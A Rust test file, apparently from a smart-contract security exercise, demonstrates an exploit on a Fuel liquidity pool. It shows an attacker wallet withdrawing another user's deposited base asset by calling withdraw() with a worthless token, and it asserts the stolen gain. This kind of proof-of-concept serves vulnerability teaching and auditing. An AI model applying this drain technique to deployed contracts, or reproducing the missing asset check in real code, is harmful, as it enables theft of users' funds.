use fuels::{
    accounts::wallet, crypto::SecretKey, prelude::*, types::{AssetId, Bits256, Bytes32, ContractId, SizedAsciiString}
};

use rand::Rng;
use std::str::FromStr;
use sha2::{Digest, Sha256};


/*
      The above imports are to be used in the test, make sure to import and also some needed rust libraries if need be
*/

/*
abigen!() is a procedural macro that writes a new instance of the contract functions in rust bindings in order
to interact with the contract using rust easily. read more here -> https://docs.fuel.network/docs/fuels-rs/abigen/the-abigen-macro/
*/

abigen!(Contract(
    name = "LiquidityPool",
    abi = "out/debug/liquidity-pool-exploit-abi.json"
));

/*
   `get_contract_instance()` will be used to create the instance, wallets, get the contract_id, and assetIds needed in the tests.
   to write your's in your own taste read more here -> 
   - https://docs.fuel.network/docs/fuels-rs/connecting/
   - https://docs.fuel.network/docs/fuels-rs/wallets/
*/

async fn get_contract_instance() -> (LiquidityPool<WalletUnlocked>, WalletUnlocked, WalletUnlocked, ContractId, AssetId, AssetId) {

   /*
     This is where we start, firstly we create the base_asset_id, thats needed to make deposits to the liquidity pool contracts
   */

    let base_asset_id: AssetId =
    "0x9ae5b658754e096e4d681c548daf46354495a437cc61492599e33fc64dcdc30c".parse().unwrap();

    /*
      Here we create a useless token of zero value for the user wallets
     */

    let unknown_asset_id = AssetId::from([2u8; 32]);

    /*
     Notice `AssetId::zeroed()` here we create the base_token for the providers to use foe gas_fees so our users can call the contracts without reverts
    */

    let asset_ids = [AssetId::zeroed(), base_asset_id.clone(), unknown_asset_id.clone()];
     /*
      asset_configs, here we specifiy the amount of the respective assets we want out users to hold.
      for each base_token_assetId, base_asset_Id, Unknown_token_asset_id
      we want 1 UTXO, 2_000_000 for each of the asset_IDs
      */


    let asset_configs = asset_ids
         .map(|id| AssetConfig {
             id,
             num_coins: 1,
             coin_amount: 2_000_000,
           })
        .into();

    /*
     Here we specifiy the amount of wallets we want to create to be used in our tests.
     */
 
    let wallet_config = WalletsConfig::new_multiple_assets(2, asset_configs);

    /*
      we create the provide and setup our wallets with the created provider.
     */
    let wallets = launch_custom_provider_and_get_wallets(wallet_config, None, None).await.unwrap();

    /*
    get the wallet to be used for the honest user and the attacker
     */

    let wallet_user = wallets[0].clone();
    let wallet_attacker = wallets[1].clone();

    let wallet = &wallets[0].clone();
 

    /*
       deploy the contract here 
    */
    let contract_id = Contract::load_from(
        "out/debug/liquidity-pool-exploit.bin",
        LoadConfiguration::default(),
    ).unwrap()
    .deploy(wallet, TxPolicies::default())
    .await.unwrap();

    /*
    create an instance of the contract that can be called by the honest user
    */
     
    let contract_instance = LiquidityPool::new(contract_id.clone(), wallet.clone());


    /*
     here we return, 
        - the contractInstance for the honest user
        - wallet for the user
        - wallet for the attacker
        - contractsId
        - base_asset_id for the liquidity_pool
        - unknown_asset_id for the attacker to use in the tests
     */


    (contract_instance, wallet_user, wallet_attacker, contract_id.into(), base_asset_id, unknown_asset_id)

}

/*
  Here we create a helper function to get an asset ID given a subId and a contractId
*/

pub fn get_asset_id(sub_id: Bytes32, contract: ContractId) -> AssetId {
    let mut hasher = Sha256::new();
    hasher.update(*contract);
    hasher.update(*sub_id);
    AssetId::new(*Bytes32::from(<[u8; 32]>::from(hasher.finalize())))
}

/*
  Here we create a helper function to get the default assetId for a given contract
*/

pub fn get_default_asset_id(contract: ContractId) -> AssetId {
    let default_sub_id = Bytes32::from([0u8; 32]);
    get_asset_id(default_sub_id, contract)
}


/*
 Here we write the tests to simulate the scenario in the BUG-EXPLAINATION.md
*/


#[tokio::test]
async fn test_exploit() {
    // firstly we lauch provider, wallets, and the liquidity_pool instance
    let (liquidity_pool_instance, 
        wallet_user,
        wallet_attacker,
        contract_id,
        base_asset_id,
        unknown_coin
        ) = get_contract_instance().await;


        // first test check user balance of base asset

        let base_bal = wallet_user.get_asset_balance(&base_asset_id).await.unwrap();

        assert_eq!(base_bal, 2_000_000);
        println!("Balance of user for the base-asset: {:#?}", base_bal);


        // now lets call the deposit function to deposit liquidity into the pool for the honest user

        // we have to first set the call params
        let deposit_amt = 1_000_000;

        let call_params = CallParameters::default()
            .with_amount(deposit_amt)
            .with_asset_id(base_asset_id); // here we set that we want to send the base_asset to the call

        // here we get the lptoken_asset_id

       let liquidity_pool_asset_id = get_default_asset_id(contract_id.clone());

       // check that the honest user doesn't have any amount of lptoken before the call.

       let bal_user = wallet_user.clone().get_asset_balance(&liquidity_pool_asset_id).await.unwrap();

       assert_eq!(bal_user, 0);

       println!("Balance of lptoken for the user before calling deposit: {:#?}", bal_user);



       // now lets call the contract to deposit and mint some lptokens

       liquidity_pool_instance.methods()
                              .deposit(wallet_user.clone().address().into())
                              .call_params(call_params).unwrap()
                              .with_variable_output_policy(VariableOutputPolicy::Exactly(1))
                              .call()
                              .await.unwrap();


        // now we get the asset id of the token minted for the liquidity pool and log/check the bal of the honest user

        let bal_user = wallet_user.clone().get_asset_balance(&liquidity_pool_asset_id).await.unwrap();

        assert_eq!(bal_user, 2_000_000);

        println!("Balance of lptoken after the call to deposit into pool: {:#?}", bal_user);

        // now lets create an instance with the already deployed pool so the attacker can call it 

        let pool_instance = LiquidityPool::new(contract_id, wallet_attacker.clone());
        
        // before we make the call let check the balance of the attacker for the base asset before the call to exploit the pool

        let balance_before_attack = wallet_attacker.clone().get_asset_balance(&base_asset_id).await.unwrap();

        assert_eq!(balance_before_attack, 2_000_000);

        println!("Balance of the attacker  before  the call to exploit withdraw(): {:#?}", balance_before_attack);


        /* 
           now we've set up the instance for the attacker to call this is where we check if the the exploit happens
           we first setup the call_params using the usless token
        */


        let deposit_amt_for_useless_tokens = 2_000_000;

        let params = CallParameters::default()
                                        .with_amount(deposit_amt_for_useless_tokens)
                                        .with_asset_id(unknown_coin);
        // here we call the pool to exploit it 

        pool_instance.methods()
                       .withdraw(wallet_attacker.clone().address().into())
                       .call_params(params).unwrap()
                       .with_variable_output_policy(VariableOutputPolicy::Exactly(1))
                       .call()
                       .await
                       .unwrap();


        // // now we check balance of attacker after the attack


        let balance_after_attack = wallet_attacker.clone().get_asset_balance(&base_asset_id).await.unwrap();

        assert_eq!(balance_after_attack, 3_000_000);

        println!("Balance of the attacker  after the exploit: {:#?}", balance_after_attack);

}


